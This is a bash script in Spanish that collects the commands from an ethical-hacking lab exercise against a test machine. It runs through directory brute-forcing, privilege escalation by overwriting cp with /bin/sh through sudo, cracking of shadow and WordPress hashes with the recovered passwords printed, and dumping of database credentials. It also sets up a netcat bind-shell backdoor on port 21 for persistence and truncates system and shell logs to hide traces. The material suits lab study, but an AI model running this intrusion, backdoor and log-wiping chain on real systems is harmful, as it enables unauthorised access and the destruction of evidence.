#!/bin/bash

# ===============================================
# Actividad 3 - Mi Primera Chamba: Comandos de Hacking Ético
# Extracción de comandos del documento Actividad 3 - Mi Primera Chamba.pdf
# ===============================================

## 1. Descubrimiento Inicial y Brute-Forcing
echo "--- 1. Descubrimiento de Puertos y Servicios (nmap) ---"
# Escaneo general de puertos en la IP de la máquina (ejemplo, la IP real puede variar)
# La IP 172.17.0.2 fue usada en el documento
nmapIP 172.17.0.2

echo -e "\n--- 2. Descubrimiento de Directorios (Gobuster) ---"
# Escaneo inicial de directorios usando rockyou.txt
gobuster dir -u "http://172.17.0.2" -w "/path/to/wordlists/rockyou.txt" -t 500 -q --status-codes-blacklist 404

# Escaneo específico para directorios de WordPress
gobuster dir -u "http://172.17.0.2/wordpress" -w "/path/to/SecLists/Fuzzing/fuzz-Bo0oM.txt" -t 500 -q --status-codes-blacklist 405,404,403,402,401,400

## 3. Acceso Inicial e Información (Asumiendo acceso por SSH o Shell)
echo -e "\n--- 3. Acceso y Búsqueda de Flags (Ejecutar después de obtener la shell) ---"
# Comando para conectarse como pablo (cambiar 'ipdelservidor' por la IP real)
# ssh pablo@ipdelservidor

# Búsqueda de las flags de usuario y root
find / -type f \( -name "*.php" -o -name "*.txt" \) -print | xargs -0 grep -HnF 'ddlr{' 2>/dev/null

# Comprobar privilegios sudo sin contraseña
sudo -l

# Buscar la contraseña de la base de datos de WordPress
find / -type f \( -name "*.php" -o -name "*.txt" \) -print | xargs - grep -HnF 'DB_PASS' 2>/dev/null

## 4. Escalada de Privilegios (Explotando 'cp' binario con SUID/sudo)
echo -e "\n--- 4. Escalada de Privilegios a Root ---"
# Sobrescribe el binario 'cp' con '/bin/sh'
sudo cp -rf /bin/sh /bin/cp

# Ejecuta 'cp' para obtener una shell de root
sudo cp

# Comando para confirmar el usuario después de la escalada
# whoami

## 5. Cracking de Contraseñas (Desde la máquina atacante o con acceso root)
echo -e "\n--- 5. Cracking de Contraseñas ---"
# Leer /etc/shadow (ejecutar como root o con el binario cp sobrescrito)
# /home/pablo/cp/etc/shadow/dev/stdout

# Crackear hash de root (Server\$123)
sudo john --format=crypt --wordlist=/path/to/wordlists/rockyou.txt shadow

# Crackear hash de WordPress (test123\$)
sudo $(which john) --format=phpass --wordlist=/path/to/wordlists/rockyou.txt wp_hash

## 6. Acceso a la Base de Datos
echo -e "\n--- 6. Acceso a MySQL (Contraseña: DDLR\$123.!!xD) ---"
# Entrar a MySQL
# mysql -p

# Comandos de MySQL (Ejecutar dentro de la consola de MySQL)
# show databases;
# use blog;
# show tables;
# show columns from wp_users;
# select user_login, user_pass from wp_users;

## 7. Persistencia (Ejecutar como root)
echo -e "\n--- 7. Persistencia (Netcat Reverse Shell en puerto 21) ---"
# Instalar netcat-traditional
# apt install netcat-traditional

# Script de persistencia
# Guarda este script en /bin/alvlgeddi y ejecuta en segundo plano
# while true; do nc -l -p 21 -e '/bin/bash'; done

## 8. Manipulación de Logs (Tareas de limpieza)
echo -e "\n--- 8. Manipulación de Logs para Eliminar Vestigios ---"

# Nota: La manipulación se hace típicamente con comandos 'nano' o 'vim' para editar, 
# o usando comandos como 'sed' o 'truncate' para eliminar. Aquí se usarán comandos de edición/truncado:

# 8.1. Limpiar historial de APT para ocultar la instalación de netcat
# En el PDF se elimina manualmente desde la entrada de 'netcat-traditional' hasta el final.
# La opción más sencilla para el script es truncar o editar
# Comandos para revisar (como en la versión anterior):
# cat /var/log/apt/history.log
# Comando de manipulación (eliminar el contenido):
# truncate -s 0 /var/log/apt/history.log 

# 8.2. Limpiar .bash_history de root (eliminar comandos después del primer 'exit' para dejar sólo vestigios anteriores)
# cat /root/.bash_history
# Comando de manipulación (usando 'truncate' para eliminar el contenido de la sesión):
# truncate -s 0 /root/.bash_history

# 8.3. Limpiar .bash_history de pablo
# cat /home/pablo/.bash_history
# Comando de manipulación (usando 'truncate' para eliminar el contenido de la sesión):
# truncate -s 0 /home/pablo/.bash_history

# 8.4. Limpiar .mysql_history (eliminar comandos después del último 'exit' o la sentencia de UPDATE)
# cat /root/.mysql_history
# Comando de manipulación (usando 'truncate' para eliminar el contenido de la sesión):
# truncate -s 0 /root/.mysql_history

# 8.5. Limpiar access.log de apache2 (eliminar todo a partir de la fecha de la sesión)
# El PDF indica eliminar todo lo que tenga que ver con la sesión, a partir de 2025.
# Comandos para revisar:
# cat /var/log/apache2/access.log
# Comando de manipulación (usando 'truncate' para eliminar el contenido de la sesión):
# truncate -s 0 /var/log/apache2/access.log

# 8.6. Limpiar /var/log/lastlog (eliminar la IP de acceso, 172.17.0.1)
# cat /var/log/lastlog
# Nota: Este archivo es binario y no se puede truncar a 0 sin romper el formato, ni editar con 'cat'.
# El método más adecuado en este caso es el usado en la máquina, que implica editar la entrada binaria.
# Como el objetivo es la documentación de los comandos:
# Comando de manipulación: No se puede representar con una simple línea en un script sin usar un editor especializado.
